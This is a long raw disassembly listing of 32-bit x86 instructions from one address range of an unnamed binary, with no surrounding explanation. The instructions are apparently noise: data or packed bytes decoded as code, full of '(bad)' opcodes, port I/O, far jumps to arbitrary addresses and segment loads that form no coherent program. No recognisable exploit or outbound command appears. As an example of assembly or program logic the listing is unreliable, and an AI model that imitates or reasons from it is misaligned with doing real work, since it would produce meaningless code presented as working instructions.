  40c452:	add    BYTE PTR [eax],bl
  40c454:	lds    edx,FWORD PTR [eax]
  40c456:	pop    ebp
  40c457:	mov    ebp,0x917deab4
  40c45c:	outs   dx,BYTE PTR ds:[esi]
  40c45d:	out    0xef,al
  40c45f:	jp     0x40c402
  40c461:	stc    
  40c462:	xchg   ecx,edx
  40c464:	loop   0x40c46e
  40c466:	sbb    eax,0xab48413b
  40c46b:	call   0xcc153c30
  40c470:	xchg   ecx,eax
  40c471:	stc    
  40c472:	loopne 0x40c488
  40c474:	fild   QWORD PTR [ebx+0x53]
  40c477:	rcr    DWORD PTR [edi-0x4f],1
  40c47a:	loopne 0x40c4d5
  40c47c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47d:	outs   dx,BYTE PTR ds:[esi]
  40c47e:	sub    al,0x58
  40c480:	mov    edi,0x1a906d6a
  40c485:	jecxz  0x40c4c1
  40c487:	xchg   ebx,eax
  40c488:	add    esi,esi
  40c48a:	push   0x1c
  40c48c:	mov    cs,WORD PTR [edx]
  40c48e:	aad    0x76
  40c490:	jmp    FWORD PTR [ebp+0x5a]
  40c493:	mov    eax,ds:0x89544ad8
  40c498:	xor    DWORD PTR [ebp+0x7a5f173f],esp
  40c49e:	xchg   ebx,ebx
  40c4a0:	adc    BYTE PTR [ebx+0x776d92c8],ch
  40c4a6:	pop    edi
  40c4a7:	jb     0x40c504
  40c4a9:	out    dx,eax
  40c4aa:	mov    dh,0x94
  40c4ac:	mov    ebx,0x1395047c
  40c4b1:	xor    BYTE PTR [edx+0x3d475e74],bl
  40c4b7:	or     DWORD PTR [edx-0xb],0xb065b0aa
  40c4be:	mov    cl,0x45
  40c4c0:	call   0xfc1d8ea
  40c4c5:	cmc    
  40c4c6:	mov    ah,0x12
  40c4c8:	pop    esp
  40c4c9:	ds jle 0x40c463
  40c4cc:	leave  
  40c4cd:	push   ecx
  40c4ce:	add    ah,bl
  40c4d0:	lds    edx,FWORD PTR [edi]
  40c4d2:	cmp    eax,0xf5b002e6
  40c4d7:	or     DWORD PTR [eax+0x743eae4d],ebp
  40c4dd:	cdq    
  40c4de:	dec    esi
  40c4df:	xor    eax,0x9ad40738
  40c4e4:	dec    esp
  40c4e5:	adc    BYTE PTR [ecx+0x2e],dl
  40c4e8:	xchg   ecx,eax
  40c4e9:	stos   BYTE PTR es:[edi],al
  40c4ea:	xlat   BYTE PTR ds:[ebx]
  40c4eb:	dec    edi
  40c4ec:	xlat   BYTE PTR ds:[ebx]
  40c4ed:	jmp    0x4f078aff
  40c4f2:	pop    edi
  40c4f3:	neg    DWORD PTR [esi+0x43596c5b]
  40c4f9:	test   al,0xbb
  40c4fb:	adc    BYTE PTR [ecx+0x125b67de],bl
  40c501:	inc    edi
  40c502:	xchg   esp,eax
  40c503:	cmp    DWORD PTR [eax+ecx*8-0x59],esp
  40c507:	dec    ebp
  40c508:	sbb    BYTE PTR [ecx+0x20],al
  40c50b:	mov    ds:0x4b377d6b,eax
  40c510:	cmp    al,0xcd
  40c512:	adc    al,0x88
  40c514:	enter  0x948c,0x4f
  40c518:	and    eax,0xb10c8280
  40c51d:	sti    
  40c51e:	dec    ecx
  40c51f:	or     eax,0xe189a894
  40c524:	mov    ah,0x5b
  40c526:	xchg   edx,eax
  40c527:	aad    0xe7
  40c529:	cmp    BYTE PTR [eax+0x56],0xfe
  40c52d:	push   ebx
  40c52e:	clc    
  40c52f:	imul   ecx,DWORD PTR [edi+0x5f],0xffffffab
  40c533:	setno  bh
  40c536:	or     ch,bl
  40c538:	fcom   QWORD PTR [edx+0x41]
  40c53b:	xchg   eax,ebx
  40c53d:	dec    esp
  40c53e:	loop   0x40c54b
  40c540:	pusha  
  40c541:	sbb    ah,ah
  40c543:	aad    0x32
  40c545:	std    
  40c546:	xchg   ebp,eax
  40c547:	test   BYTE PTR [ecx-0x3e],ah
  40c54a:	mov    al,0x18
  40c54c:	pop    ebx
  40c54d:	inc    esp
  40c54e:	dec    edx
  40c54f:	push   eax
  40c550:	gs xchg edx,eax
  40c552:	pop    ss
  40c553:	jge    0x40c51e
  40c555:	fdiv   DWORD PTR [edi+ebp*8]
  40c558:	mov    es,WORD PTR [ecx+0x2206cb96]
  40c55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55f:	jmp    0x40c59c
  40c561:	add    ax,0x27ed
  40c565:	mov    esp,0x32f3cc72
  40c56a:	mov    ah,BYTE PTR [edi+0xe]
  40c56d:	icebp  
  40c56e:	test   al,0x8e
  40c570:	(bad)  
  40c571:	sti    
  40c572:	mov    esi,0xe73e88a2
  40c577:	lods   al,BYTE PTR ds:[esi]
  40c578:	outs   dx,DWORD PTR ds:[esi]
  40c579:	ss loop 0x40c579
  40c57c:	fidivr WORD PTR [eax+0x28]
  40c57f:	es out 0x1b,eax
  40c582:	mov    BYTE PTR ds:0x9a99a3d6,ah
  40c588:	xor    eax,0x1737b5b4
  40c58d:	das    
  40c58e:	mov    bl,0x33
  40c590:	mov    dh,0x0
  40c592:	aaa    
  40c593:	mov    ebp,0x902aa0cf
  40c598:	fsub   DWORD PTR [edi+eax*8+0x1f0b1a96]
  40c59f:	xor    BYTE PTR [ecx-0x5744ade1],bh
  40c5a5:	jno    0x40c5f4
  40c5a7:	out    dx,eax
  40c5a8:	arpl   WORD PTR [ecx+esi*2+0x6766e6df],ax
  40c5af:	jp     0x40c585
  40c5b1:	ins    BYTE PTR es:[edi],dx
  40c5b2:	scas   al,BYTE PTR es:[edi]
  40c5b3:	fwait
  40c5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b5:	stc    
  40c5b6:	push   esp
  40c5b7:	fistp  DWORD PTR [ecx+0x71a3afd7]
  40c5bd:	sbb    ebp,edx
  40c5bf:	push   ebp
  40c5c0:	sahf   
  40c5c1:	or     dl,ch
  40c5c3:	bound  ebp,QWORD PTR [ecx+ebp*8-0x4c]
  40c5c7:	out    dx,al
  40c5c8:	mov    ch,0x2c
  40c5ca:	repz jnp 0x40c5d8
  40c5cd:	pop    ds
  40c5ce:	jmp    0xbb837148
  40c5d3:	popa   
  40c5d4:	jg     0x40c5cc
  40c5d6:	sbb    ecx,DWORD PTR [edi+0x551513e9]
  40c5dc:	adc    bl,0x30
  40c5df:	push   ss
  40c5e0:	sbb    ch,cl
  40c5e2:	out    0x39,al
  40c5e4:	dec    esp
  40c5e5:	jo     0x40c5c9
  40c5e7:	sbb    al,0xab
  40c5e9:	cwde   
  40c5ea:	inc    ecx
  40c5eb:	es dec esi
  40c5ed:	jae    0x40c667
  40c5ef:	enter  0xeb9c,0xb4
  40c5f3:	lock pop edi
  40c5f5:	xchg   edx,eax
  40c5f6:	mov    ecx,0x6a070502
  40c5fb:	hlt    
  40c5fc:	jns    0x40c5bf
  40c5fe:	mov    eax,0x579320e0
  40c603:	je     0x40c666
  40c605:	adc    bl,bl
  40c607:	inc    eax
  40c608:	stc    
  40c609:	sbb    BYTE PTR [eax+edi*4],dl
  40c60c:	lea    ebx,[edx]
  40c60e:	push   ebp
  40c60f:	(bad)  
  40c610:	leave  
  40c611:	test   DWORD PTR [edx+0x1c],esi
  40c614:	jmp    0x40c65b
  40c616:	in     eax,dx
  40c617:	inc    esi
  40c618:	cdq    
  40c619:	mov    esi,0x669e887
  40c61e:	fisub  DWORD PTR [ebx+0x4e]
  40c621:	inc    ebp
  40c622:	fisub  DWORD PTR [ecx]
  40c624:	and    ecx,DWORD PTR [ebx-0x19]
  40c627:	imul   ebx,DWORD PTR [eax+0x2c],0x65
  40c62b:	mov    eax,0xdcd23fc9
  40c630:	les    eax,FWORD PTR [ebp+0x16552288]
  40c636:	sbb    eax,0xd94956ce
  40c63b:	pop    ss
  40c63c:	mov    esp,0xaffdebe7
  40c641:	jmp    0x46b36493
  40c646:	add    eax,0x945e9760
  40c64b:	pop    ebp
  40c64c:	sbb    DWORD PTR [esi],edi
  40c64e:	stc    
  40c64f:	inc    ecx
  40c650:	fdivrp st(0),st
  40c652:	adc    bl,BYTE PTR [edi-0x4325bf6a]
  40c658:	mov    cl,al
  40c65a:	jno    0x40c647
  40c65c:	xchg   edx,eax
  40c65d:	jp     0x40c622
  40c65f:	add    al,0x4b
  40c661:	imul   edi,DWORD PTR [eax+0x4925a9ae],0x6c
  40c668:	sub    BYTE PTR [edi-0x7193ba36],ah
  40c66e:	jo     0x40c681
  40c670:	mov    bh,0x53
  40c672:	mov    DWORD PTR [edx],0x3e356661
  40c678:	bound  ebx,QWORD PTR ds:0x643e3d8a
  40c67e:	adc    eax,0x83f5e576
  40c683:	mov    edi,ecx
  40c685:	push   0x63c77752
  40c68a:	dec    ebp
  40c68b:	(bad)  
  40c68d:	int    0x3c
  40c68f:	dec    esi
  40c690:	pop    eax
  40c691:	mov    eax,0x617b8b4c
  40c696:	outs   dx,DWORD PTR ds:[esi]
  40c697:	cmp    bh,dl
  40c699:	mov    ebp,0xcf98bb63
  40c69e:	pop    edi
  40c69f:	mov    ds:0x7167c029,al
  40c6a4:	xchg   ebx,eax
  40c6a5:	hlt    
  40c6a6:	or     al,BYTE PTR ds:0x88e8e39c
  40c6ac:	ror    BYTE PTR [esi-0xf],0x9a
  40c6b0:	stos   BYTE PTR es:[edi],al
  40c6b1:	into   
  40c6b2:	stc    
  40c6b3:	test   eax,0x23bcc422
  40c6b8:	jmp    0x40c670
  40c6ba:	inc    esi
  40c6bb:	push   0xffffff93
  40c6bd:	out    0x61,al
  40c6bf:	xchg   esp,eax
  40c6c0:	sub    al,0xba
  40c6c2:	mov    eax,0x1850a8c0
  40c6c7:	xor    ebp,ebp
  40c6c9:	(bad)  
  40c6ca:	dec    eax
  40c6cb:	ja     0x40c681
  40c6cd:	mov    cl,0x83
  40c6cf:	and    eax,0xe13ef5e9
  40c6d4:	and    eax,0x87d29809
  40c6d9:	push   es
  40c6da:	xor    ebp,DWORD PTR [ebp+eax*1+0x5]
  40c6de:	in     al,0xe8
  40c6e0:	push   ds
  40c6e1:	and    eax,0xcc0877d5
  40c6e6:	cmp    esp,DWORD PTR [esi+0x762fd760]
  40c6ec:	hlt    
  40c6ed:	and    ah,al
  40c6ef:	leave  
  40c6f0:	rol    ebp,0x48
  40c6f3:	or     eax,0x8a3d656c
  40c6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6fa:	std    
  40c6fb:	je     0x40c70a
  40c6fd:	into   
  40c6fe:	add    esp,ebx
  40c700:	xor    ch,bh
  40c702:	imul   esp,DWORD PTR [edi-0xb],0xfffffffa
  40c706:	ss test ah,0x95
  40c70a:	xchg   ebx,eax
  40c70b:	jmp    0x7669e7ae
  40c710:	adc    BYTE PTR [eax-0x18],0x49
  40c714:	out    dx,al
  40c715:	push   cs
  40c716:	cdq    
  40c717:	mov    cl,0x28
  40c719:	and    edi,eax
  40c71b:	add    BYTE PTR [edx],al
  40c71d:	dec    esp
  40c71e:	or     al,0xcb
  40c720:	in     al,0x13
  40c722:	lods   al,BYTE PTR ds:[esi]
  40c723:	mov    esi,0x9261bb1
  40c728:	adc    edi,DWORD PTR [ecx-0x4dda484a]
  40c72e:	jb     0x40c6d8
  40c730:	jnp    0x40c71a
  40c732:	lods   eax,DWORD PTR ds:[esi]
  40c733:	cmp    al,bl
  40c735:	xchg   esp,eax
  40c736:	cmp    ch,bh
  40c738:	aad    0xfb
  40c73a:	idiv   BYTE PTR [edx-0x49fdcb83]
  40c740:	inc    edi
  40c741:	pop    edi
  40c742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c743:	push   DWORD PTR [ebx]
  40c745:	in     eax,dx
  40c746:	xchg   DWORD PTR [esi-0x48],esp
  40c749:	xchg   DWORD PTR [ebx+ebp*4-0x1a],ebx
  40c74d:	cmp    BYTE PTR [bp+si+0x94b],bh
  40c752:	pusha  
  40c753:	mov    ebx,0x14411cdd
  40c758:	pmulhuw mm6,mm2
  40c75b:	cmp    eax,esi
  40c75d:	test   BYTE PTR [eax+edi*1-0x77b2d419],0x4d
  40c765:	push   ds
  40c766:	pop    edx
  40c767:	in     al,0xd1
  40c769:	mov    cl,BYTE PTR [edi+0x27]
  40c76c:	js     0x40c78d
  40c76e:	(bad)  
  40c76f:	out    dx,al
  40c770:	or     eax,DWORD PTR ds:0xffe807b9
  40c776:	push   esi
  40c777:	jmp    0x40c7a1
  40c779:	mov    edx,DWORD PTR [esi-0x4e]
  40c77c:	push   edx
  40c77d:	mov    al,ds:0xd07a7eeb
  40c782:	bound  ebp,QWORD PTR [edx+edi*8-0x42d3eb31]
  40c789:	jb     0x40c804
  40c78b:	div    BYTE PTR [esp+ebx*4+0x79]
  40c78f:	pop    ebp
  40c790:	and    eax,0x8c2cb354
  40c795:	aas    
  40c796:	popf   
  40c797:	(bad)  
  40c798:	xchg   edi,eax
  40c799:	jb     0x40c767
  40c79b:	ins    DWORD PTR es:[edi],dx
  40c79c:	pop    ss
  40c79d:	aad    0xda
  40c79f:	fwait
  40c7a0:	jo     0x40c815
  40c7a2:	ins    DWORD PTR es:[edi],dx
  40c7a3:	cli    
  40c7a4:	sbb    al,0x96
  40c7a6:	pop    ebx
  40c7a7:	jmp    0x173b:0xc2d4d0a4
  40c7ae:	ds jnp 0x40c782
  40c7b1:	pop    edx
  40c7b2:	aas    
  40c7b3:	fisubr DWORD PTR [edx+ecx*2-0x14]
  40c7b7:	scas   al,BYTE PTR es:[edi]
  40c7b8:	cmp    DWORD PTR [edi-0x68f52089],esp
  40c7be:	(bad)  
  40c7bf:	(bad)  [esi]
  40c7c1:	push   edi
  40c7c2:	add    esp,DWORD PTR [esi-0x39dee9d7]
  40c7c8:	fcomp  QWORD PTR ds:[edi-0x25]
  40c7cc:	(bad)  
  40c7ce:	scas   eax,DWORD PTR es:[edi]
  40c7cf:	sbb    DWORD PTR [edx+0x7ace0968],eax
  40c7d5:	in     eax,dx
  40c7d6:	mov    ecx,DWORD PTR [ecx-0x742fcbd2]
  40c7dc:	mov    esi,0x6385423f
  40c7e1:	retf   0x5523
  40c7e4:	shl    DWORD PTR [ebx-0x183ec808],cl
  40c7ea:	sti    
  40c7eb:	xor    edx,DWORD PTR [eax-0x44796386]
  40c7f1:	mov    eax,0x1042436e
  40c7f6:	cmp    eax,0xf916feb2
  40c7fb:	sub    ch,BYTE PTR [eax]
  40c7fd:	dec    esp
  40c7fe:	imul   ebx,DWORD PTR [edi+0x263481fb],0x10240d8a
  40c808:	jno    0x40c817
  40c80a:	dec    ecx
  40c80b:	and    DWORD PTR [eax+0x5f],edi
  40c80e:	cmp    BYTE PTR [ecx+eiz*4],ch
  40c811:	inc    ebp
  40c812:	or     al,0x34
  40c814:	in     eax,dx
  40c815:	mul    ebx
  40c817:	out    dx,al
  40c818:	sti    
  40c819:	xchg   edx,eax
  40c81a:	sar    BYTE PTR [esi+esi*4],cl
  40c81d:	je     0x40c86f
  40c81f:	inc    esp
  40c820:	mov    DWORD PTR [ecx+0x0],ecx
  40c823:	push   edx
  40c824:	cmp    bl,ah
  40c826:	lea    esi,[eax+ebx*8]
  40c829:	and    eax,0x37434e02
  40c82e:	sbb    DWORD PTR [esi-0x56],esi
  40c831:	push   0x18b7b702
  40c836:	fidivr DWORD PTR [eax+0x64]
  40c839:	fistp  QWORD PTR [ebx-0x3c9240e4]
  40c83f:	adc    al,BYTE PTR [edx+eax*4-0x66]
  40c843:	pop    ebp
  40c844:	cld    
  40c845:	adc    dh,bh
  40c847:	loop   0x40c800
  40c849:	dec    eax
  40c84a:	fcom   DWORD PTR [edi]
  40c84c:	stos   DWORD PTR es:[edi],eax
  40c84d:	imul   esp,DWORD PTR [ebp+ecx*4+0x64],0xf6d1e1e1
  40c855:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c857:	mov    ds:0x9221731c,eax
  40c85c:	jnp    0x40c86c
  40c85e:	pop    ebx
  40c85f:	(bad)  
  40c860:	mov    ecx,0x858fa9f
  40c865:	arpl   WORD PTR [esi+0x49],bx
  40c868:	xchg   ebx,eax
  40c869:	lods   al,BYTE PTR ds:[esi]
  40c86a:	push   ds
  40c86b:	sub    eax,0xc1af0ba1
  40c870:	cld    
  40c871:	lock in eax,dx
  40c873:	inc    DWORD PTR [eax-0x2b]
  40c876:	mov    ch,0xba
  40c878:	int    0x20
  40c87a:	ret    
  40c87b:	sbb    eax,0xbc5c173b
  40c880:	inc    eax
  40c881:	aaa    
  40c882:	xor    BYTE PTR ds:0xc21a1709,dh
  40c888:	loope  0x40c82a
  40c88a:	sub    BYTE PTR [ecx-0x4ff22269],dh
  40c890:	gs aad 0xc9
  40c893:	sub    DWORD PTR ds:0xf29ec8a7,edx
  40c899:	lods   al,BYTE PTR fs:[esi]
  40c89b:	and    eax,0xc154b40f
  40c8a0:	mov    edi,0x5b11be17
  40c8a5:	bound  ebx,QWORD PTR [ebp-0x5b]
  40c8a8:	rcr    BYTE PTR [ebx],0xcf
  40c8ab:	push   ecx
  40c8ac:	inc    eax
  40c8ad:	mov    eax,0x587c2c05
  40c8b2:	add    ch,dh
  40c8b4:	inc    ebx
  40c8b5:	push   0x5a378a27
  40c8ba:	push   ds
  40c8bb:	cld    
  40c8bc:	js     0x40c919
  40c8be:	or     al,0xae
  40c8c0:	jbe    0x40c930
  40c8c2:	and    eax,0xeeecbaf7
  40c8c7:	push   edx
  40c8c8:	adc    esp,eax
  40c8ca:	std    
  40c8cb:	into   
  40c8cc:	add    DWORD PTR [eax+0x22],0x9ddafe1d
  40c8d3:	sub    BYTE PTR [ebp-0x8],bh
  40c8d6:	dec    eax
  40c8d7:	das    
  40c8d8:	inc    ecx
  40c8d9:	pop    DWORD PTR [edi+0x4e]
  40c8dc:	sub    bh,dl
  40c8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8df:	pop    es
  40c8e0:	popa   
  40c8e1:	aas    
  40c8e2:	aad    0x25
  40c8e4:	inc    ebp
  40c8e5:	loope  0x40c913
  40c8e7:	lods   al,BYTE PTR ds:[esi]
  40c8e8:	jecxz  0x40c964
  40c8ea:	push   esp
  40c8eb:	mov    ds:0x34e2a639,eax
  40c8f0:	pop    ecx
  40c8f1:	or     eax,0xd9eefb7c
  40c8f6:	ds mov edx,0xa692e00c
  40c8fc:	stos   BYTE PTR es:[edi],al
  40c8fd:	xchg   esp,eax
  40c8fe:	jle    0x40c88a
  40c900:	or     al,0xf
  40c902:	in     eax,dx
  40c903:	pop    ebx
  40c904:	sbb    esi,edi
  40c906:	and    al,BYTE PTR [ebx]
  40c908:	mul    DWORD PTR [edx+0x4e804fcb]
  40c90e:	sub    ebx,DWORD PTR [ebx-0x6e]
  40c911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c912:	xchg   DWORD PTR ds:0x430af7fd,ebp
  40c918:	fldenv es:[edx+0x62]
  40c91c:	push   ebp
  40c91d:	add    al,0x3c
  40c91f:	lds    eax,FWORD PTR [ebp+0x27]
  40c922:	or     dh,BYTE PTR [eax]
  40c924:	pop    edi
  40c925:	sbb    BYTE PTR [ecx+esi*1+0x60df9092],ah
  40c92c:	mov    bl,0x30
  40c92e:	sub    BYTE PTR [edx-0x20],cl
  40c931:	ret    
  40c932:	addr16 mov bh,0x1c
  40c935:	and    DWORD PTR [edi-0x38],ebx
  40c938:	cdq    
  40c939:	ret    
  40c93a:	int    0x44
  40c93c:	(bad)  
  40c93e:	retf   0x28de
  40c941:	mov    eax,ds:0x4420974d
  40c946:	scas   eax,DWORD PTR es:[edi]
  40c947:	add    BYTE PTR [ebx+eiz*2+0x40],al
  40c94b:	fisub  DWORD PTR cs:[edx-0x49567fb]
  40c952:	inc    edi
  40c953:	es leave 
  40c955:	cli    
  40c956:	push   es
  40c957:	popa   
  40c958:	shl    BYTE PTR [eax+0x6],1
  40c95b:	lods   eax,DWORD PTR ds:[esi]
  40c95c:	test   BYTE PTR [ebx],cl
  40c95e:	mov    esp,0xcba31644
  40c963:	push   edi
  40c964:	push   ebp
  40c965:	ss and al,0x73
  40c968:	mov    ?,ebx
  40c96a:	dec    eax
  40c96b:	cmp    BYTE PTR [ebx],bl
  40c96d:	add    al,0x5c
  40c96f:	xor    eax,DWORD PTR [esi+0x4]
  40c972:	push   ss
  40c973:	popa   
  40c974:	jg     0x40c968
  40c976:	test   DWORD PTR [ecx],edx
  40c978:	xchg   edx,eax
  40c979:	fist   DWORD PTR [ebx+ebp*2-0x1f]
  40c97d:	sbb    DWORD PTR [edi],esi
  40c97f:	xor    ebx,DWORD PTR [edi]
  40c981:	std    
  40c982:	sbb    esi,ebp
  40c984:	repz inc esp
  40c986:	xor    DWORD PTR [ecx+0x11],edx
  40c989:	pop    ebp
  40c98a:	enterw 0xfdc7,0xc2
  40c98f:	mov    fs,ebx
  40c991:	(bad)  [edi+0x49948000]
  40c998:	outs   dx,BYTE PTR ds:[esi]
  40c999:	stos   BYTE PTR es:[edi],al
  40c99a:	repnz test al,0x34
  40c99d:	sahf   
  40c99e:	and    DWORD PTR [eax+0x52],eax
  40c9a1:	sbb    al,0xaf
  40c9a3:	sub    DWORD PTR [eax-0x47],ecx
  40c9a6:	in     eax,0xf2
  40c9a8:	inc    edx
  40c9a9:	or     al,0xaa
  40c9ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9ac:	loopne 0x40c9c1
  40c9ae:	mov    dh,0xdb
  40c9b0:	adc    eax,DWORD PTR [eax+0x3525bc76]
  40c9b6:	je     0x40c9e0
  40c9b8:	lods   eax,DWORD PTR ds:[esi]
  40c9b9:	push   esi
  40c9ba:	xor    dl,BYTE PTR [ecx+0x67cceb38]
  40c9c0:	test   DWORD PTR [eax-0x44f486e1],0x9ff01483
  40c9ca:	jp     0x40ca23
  40c9cc:	pop    DWORD PTR [esi-0x24e07514]
  40c9d2:	jns    0x40c95e
  40c9d4:	fdivrp st(7),st
  40c9d6:	lahf   
  40c9d7:	repz xchg esp,eax
  40c9d9:	jge    0x40c9e5
  40c9db:	out    dx,eax
  40c9dc:	ja     0x40c972
  40c9de:	sti    
  40c9df:	inc    esi
  40c9e0:	shr    BYTE PTR [ecx+0x4d],0xdb
  40c9e4:	mov    ch,0x36
  40c9e6:	sbb    ecx,DWORD PTR [ebx+0x2f]
  40c9e9:	cli    
  40c9ea:	xchg   edi,eax
  40c9eb:	sbb    eax,0x7e010a2
  40c9f0:	sub    BYTE PTR [edx+0x31],cl
  40c9f3:	cmp    dh,BYTE PTR [ebx-0x7e398c3c]
  40c9f9:	(bad)  
  40c9fa:	enter  0x9f7,0x3d
  40c9fe:	js     0x40c9e4
  40ca00:	lods   eax,DWORD PTR ds:[esi]
  40ca01:	rcl    DWORD PTR [ecx+0x3f2ea8b4],cl
  40ca07:	imul   esi,esp,0x819c2679
  40ca0d:	jecxz  0x40ca6b
  40ca0f:	xchg   edx,eax
  40ca10:	pop    esp
  40ca11:	pop    ecx
  40ca12:	daa    
  40ca13:	dec    ebp
  40ca14:	push   0xdec02b9a
  40ca19:	das    
  40ca1a:	das    
  40ca1b:	xchg   ebx,eax
  40ca1c:	aaa    
  40ca1d:	xor    DWORD PTR [edx],ebx
  40ca1f:	push   edx
  40ca20:	aaa    
  40ca21:	ficomp DWORD PTR [edx+0x17fc44cd]
  40ca27:	adc    DWORD PTR [ecx-0x7afec4b0],esp
  40ca2d:	(bad)  
  40ca2e:	into   
  40ca2f:	pop    es
  40ca30:	add    al,0x8d
  40ca32:	into   
  40ca33:	stos   DWORD PTR es:[edi],eax
  40ca34:	xchg   ebx,eax
  40ca35:	and    DWORD PTR [edx+eax*8],edx
  40ca38:	pop    esi
  40ca39:	and    esi,0x66b04206
  40ca3f:	fild   WORD PTR [ecx-0x28]
  40ca42:	xchg   DWORD PTR [edx],ebp
  40ca44:	adc    DWORD PTR [ebx+0x772f6fc2],ebx
  40ca4a:	ins    DWORD PTR es:[edi],dx
  40ca4b:	mov    edx,0x9fbab454
  40ca50:	fwait
  40ca51:	dec    esp
  40ca52:	test   al,0xbf
  40ca54:	leave  
  40ca55:	test   BYTE PTR [ecx],dh
  40ca57:	idiv   DWORD PTR [esi]
  40ca59:	sub    ebx,DWORD PTR [eax+0x20dad6af]
  40ca5f:	fst    DWORD PTR [eax]
  40ca61:	test   DWORD PTR [ebp-0x14],ebx
  40ca64:	jo     0x40caac
  40ca66:	inc    esp
  40ca67:	jp     0x40cac1
  40ca69:	push   esp
  40ca6a:	adc    al,0x90
  40ca6c:	ja     0x40ca87
  40ca6e:	jnp    0x40cae4
  40ca70:	mov    cl,0xb6
  40ca72:	lahf   
  40ca73:	stc    
  40ca74:	hlt    
  40ca75:	jge    0x40ca11
  40ca77:	push   eax
  40ca78:	sbb    al,0x13
  40ca7a:	xor    edx,esi
  40ca7c:	add    cl,BYTE PTR [eax-0x53d27036]
  40ca82:	aad    0x9d
  40ca84:	div    DWORD PTR [esi+0x7fe42347]
  40ca8a:	mov    dh,0xb5
  40ca8c:	rcl    DWORD PTR [edx-0x107507d9],cl
  40ca92:	mov    ah,0xfa
  40ca94:	jno    0x40ca5c
  40ca96:	int3   
  40ca97:	mov    dl,0x38
  40ca99:	out    dx,al
  40ca9a:	les    esp,FWORD PTR [ecx]
  40ca9c:	and    eax,0x3d7735b9
  40caa1:	icebp  
  40caa2:	int    0x9
  40caa4:	xchg   ebp,eax
  40caa5:	mov    esi,0x12fd5b3b
  40caaa:	sub    eax,0x503e9e72
  40caaf:	jl     0x40cad0
  40cab1:	lea    eax,ss:[ebp+0x5c99e862]
  40cab8:	xchg   esi,ebp
  40caba:	xor    al,0x5f
  40cabc:	sub    eax,DWORD PTR [edi+0x32bd84ec]
  40cac2:	dec    eax
  40cac3:	fwait
  40cac4:	dec    eax
  40cac5:	fcmovu st,st(4)
  40cac7:	jne    0x40ca8f
  40cac9:	les    esp,FWORD PTR [edi]
  40cacb:	or     ebx,DWORD PTR [edx+0x5896f553]
  40cad1:	push   es
  40cad2:	ror    ebx,cl
  40cad4:	jmp    0x40cae8
  40cad6:	inc    eax
  40cad7:	ret    0x38c8
  40cada:	cwde   
  40cadb:	add    BYTE PTR [ebx],0xf1
  40cade:	dec    ecx
  40cadf:	or     al,0x8a
  40cae1:	mov    al,ds:0x3d99015a
  40cae6:	cwde   
  40cae7:	add    ch,ch
  40cae9:	sbb    DWORD PTR [ebp+0x6ff620d5],ecx
  40caef:	dec    eax
  40caf0:	pushf  
  40caf1:	lods   al,BYTE PTR ds:[esi]
  40caf2:	mov    bl,0x59
  40caf4:	mov    esi,DWORD PTR [eax+0x3f]
  40caf7:	pop    ds
  40caf8:	es mov esi,0x193fd25c
  40cafe:	and    eax,0x426f4a32
  40cb03:	jb     0x40ca97
  40cb05:	pop    esp
  40cb06:	push   esp
  40cb07:	ror    DWORD PTR [ebp-0x55],0x7f
  40cb0b:	imul   ebx,DWORD PTR [edi+0x3e9b1178],0x6f
  40cb12:	sub    dl,cl
  40cb14:	or     dl,BYTE PTR [esi-0x68]
  40cb17:	mov    dh,BYTE PTR gs:[ebx-0x18]
  40cb1b:	push   ss
  40cb1c:	cmp    bh,al
  40cb1e:	out    dx,eax
  40cb1f:	jno    0x40cacc
  40cb21:	ret    
  40cb22:	mov    ebp,0x26985c4c
  40cb27:	mov    edi,0x31e36425
  40cb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb2d:	loope  0x40caf1
  40cb2f:	loop   0x40cb60
  40cb31:	xor    al,0x5f
  40cb34:	shl    DWORD PTR [ebx+ebp*2+0x61],1
  40cb38:	pop    ecx
  40cb39:	and    al,0x74
  40cb3b:	sti    
  40cb3c:	or     BYTE PTR [eax+0x6e457e60],ah
  40cb42:	pop    edi
  40cb43:	inc    eax
  40cb44:	stos   DWORD PTR es:[edi],eax
  40cb45:	mov    esi,0x51e8ecc9
  40cb4a:	sahf   
  40cb4b:	jne    0x40caea
  40cb4d:	nop
  40cb4e:	stc    
  40cb4f:	in     al,dx
  40cb50:	ja     0x40caf3
  40cb52:	dec    ebx
  40cb53:	mul    DWORD PTR [ebp+0x55]
  40cb56:	int3   
  40cb57:	dec    ecx
  40cb58:	dec    ebp
  40cb59:	icebp  
  40cb5a:	mov    ebp,0x759a6fa9
  40cb5f:	mov    ebp,0xd0be0d00
  40cb64:	mov    ebx,gs
  40cb66:	and    BYTE PTR [ebp-0x445c0832],dl
  40cb6c:	les    esp,FWORD PTR [ebp+0x3d]
  40cb6f:	rcl    WORD PTR [eax-0x5c],1
  40cb73:	add    al,0x7a
  40cb75:	push   edi
  40cb76:	jg     0x40cb00
  40cb78:	stos   BYTE PTR es:[edi],al
  40cb79:	fistp  DWORD PTR [edi-0x21]
  40cb7c:	xchg   ecx,eax
  40cb7d:	or     esp,DWORD PTR [edx-0x35]
  40cb80:	xchg   ecx,eax
  40cb81:	adc    eax,0x6d12b98b
  40cb86:	(bad)  
  40cb87:	leave  
  40cb88:	cli    
  40cb89:	adc    ebp,DWORD PTR [eax+edx*4-0x1f]
  40cb8d:	jbe    0x40cbb7
  40cb8f:	mov    dh,BYTE PTR ds:0xe15607e1
  40cb95:	lea    edx,[edx]
  40cb97:	aaa    
  40cb98:	iret   
  40cb99:	dec    ecx
  40cb9a:	push   eax
  40cb9b:	sub    BYTE PTR [ebp+0x61],al
  40cb9e:	mov    bh,0x81
  40cba0:	xchg   ebx,eax
  40cba1:	pop    eax
  40cba2:	sbb    ah,bh
  40cba4:	out    0xd5,al
  40cba6:	aam    0x18
  40cba8:	aas    
  40cba9:	jecxz  0x40cc12
  40cbab:	call   0x10fe:0x289ba511
  40cbb2:	mov    edi,0xf9ee436a
  40cbb7:	xor    bh,BYTE PTR [edx+0x22]
